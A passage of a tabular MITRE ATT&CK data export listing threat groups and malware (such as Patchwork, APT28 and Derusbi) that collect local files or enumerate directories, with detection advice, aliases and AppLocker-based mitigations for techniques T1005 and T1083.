'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access certain files and directories'],[],['Collection'],['Technique/T1005'],['Data from Local System'],https://attack.mitre.org/wiki/Technique/T1005
119,['Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Group/G0040|Patchwork]] collected and exfiltrated files from the infected system.[[CiteRef::Cymmetria Patchwork]]'],['Patchwork'],"['Patchwork', 'Dropping Elephant', 'Chinastrats']",['G0040'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from the local system, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access certain files and directories'],[],['Collection'],['Technique/T1005'],['Data from Local System'],https://attack.mitre.org/wiki/Technique/T1005
120,['Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Group/G0027|Threat Group-3390]] actors saved RAR files for exfiltration in the Recycler directory on a victim system.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from the local system, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access certain files and directories'],[],['Collection'],['Technique/T1005'],['Data from Local System'],https://attack.mitre.org/wiki/Technique/T1005
121,['Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","[""[[Group/G0027|Threat Group-3390]] ran a command to compile an archive of file types of interest from the victim user's directories.[[CiteRef::SecureWorks BRONZE UNION June 2017]]""]",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from the local system, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access certain files and directories'],[],['Collection'],['Technique/T1005'],['Data from Local System'],https://attack.mitre.org/wiki/Technique/T1005
122,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0066|3PARA RAT]] has a command to retrieve metadata for files on disk as well as a command to list the current working directory.[[CiteRef::CrowdStrike Putter Panda]]'],['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: 3PARA RAT,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
123,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0065|4H RAT]] has the capability to obtain file and directory listings.[[CiteRef::CrowdStrike Putter Panda]]'],['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: 4H RAT,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
124,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0021|Derusbi]] is capable of obtaining a directory listing.[[CiteRef::Fidelis Turbo]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: Derusbi,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
125,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0142|StreamEx]] has the ability to enumerate drive types.[[CiteRef::Cylance Shell Crew Feb 2017]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: StreamEx,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
126,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0147|Pteranodon]] identifies files matching certain file extension and copies them to subdirectories it created.[[CiteRef::Palo Alto Gamaredon Feb 2017]]'],['Gamaredon Group'],['Gamaredon Group'],['G0047'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: Pteranodon,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
127,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0070|HTTPBrowser]] is capable of listing files, folders, and drives on a victim.[[CiteRef::Dell TG-3390]][[CiteRef::ZScaler Hacking Team]]']",['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: HTTPBrowser, Token Control, HttpDump",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
128,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0106|cmd]] can be used to find files and directories with native functionality such as <code>dir</code> commands.[[CiteRef::TechNet Dir]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: cmd, cmd.exe",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
129,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0124|Pisloader]] has commands to list drives on the victim machine and to list file information for a given directory.[[CiteRef::Palo Alto DNS Requests]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: Pisloader,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
130,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0125|Remsec]] is capable of listing contents of folders on the victim.[[CiteRef::Symantec Remsec IOCs]][[CiteRef::Kaspersky ProjectSauron Technical Analysis]] [[Software/S0125|Remsec]] also searches for custom network encryption software on victims.[[CiteRef::Kaspersky ProjectSauron Full Report]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: Remsec, Backdoor.Remsec, ProjectSauron",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
131,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0129|AutoIt]] is capable of identifying documents on the victim with the following extensions: .doc; .pdf, .csv, .ppt, .docx, .pst, .xls, .xlsx, .pptx, and .jpeg.[[CiteRef::Forcepoint Monsoon]]']",['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: AutoIt,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
132,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0131|TINYTYPHON]] searches through the drive containing the OS, then all drive letters C through to Z, for documents matching certain extensions.[[CiteRef::Forcepoint Monsoon]]']",['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: TINYTYPHON,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
133,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0069|BLACKCOFFEE]] has the capability to enumerate files.[[CiteRef::FireEye APT17]]'],['APT17'],"['APT17', 'Deputy Dog']",['G0025'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: BLACKCOFFEE,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
134,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0021|Derusbi]] is capable of obtaining a directory listing.[[CiteRef::Fidelis Turbo]]'],['Axiom'],"['Axiom', 'Group 72']",['G0001'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: Derusbi,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
135,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0004|Ke3chang]] uses command-line interaction to search files and directories.[[CiteRef::Villeneuve et al 2014]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",[],['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
136,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['An older version of [[Software/S0023|CHOPSTICK]] has a module that monitors all mounted volumes for files with the extensions .doc, .docx, .pgp, .gpg, .m2f, or .m2o.[[CiteRef::ESET Sednit Part 2]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: CHOPSTICK, SPLM, ...",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
